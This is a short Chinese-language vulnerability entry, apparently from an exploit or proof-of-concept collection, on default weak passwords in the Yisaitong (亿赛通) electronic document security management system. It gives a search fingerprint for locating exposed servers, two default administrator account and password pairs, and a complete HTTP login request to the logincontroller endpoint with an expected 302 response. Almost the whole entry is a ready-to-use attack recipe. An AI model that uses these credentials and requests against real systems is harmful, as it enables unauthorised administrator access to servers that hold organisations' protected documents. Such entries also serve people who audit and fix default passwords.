# 亿赛通logincontroller存在弱口令漏洞

- **系统**：亿赛通　|　**类型**：默认口令　|　**CVE**：—
- **指纹**：`app="亿赛通-电子文档安全管理系统"`
- **请求**：`POST /CDGServer3/logincontroller HTTP/1.1`

**请求体 / payload**
```
账号/密码:
LogAdmin/Est@Spc820
DocAdmin/Est@Spc820
Host:
Cookie: JSESSIONID=429516F11D0599C79AE66B4F53AD925E; JSESSIONID=CD003EFEFA1AD89BA7D75283585C2B66; CDGServerLanguage=zh
Content-Length: 115
Content-Type: application/x-www-form-urlencoded
Sec-Fetch-User: ?1
Priority: u=0, i
command=Login&forward=frame.jsp&csrfmiddlewaretoken=1729242573777&name=LogAdmin&mima=l3sR9FHlwxCv53Xh%2BRmzVQ%3D%3D
```
- **预期**：302　|　—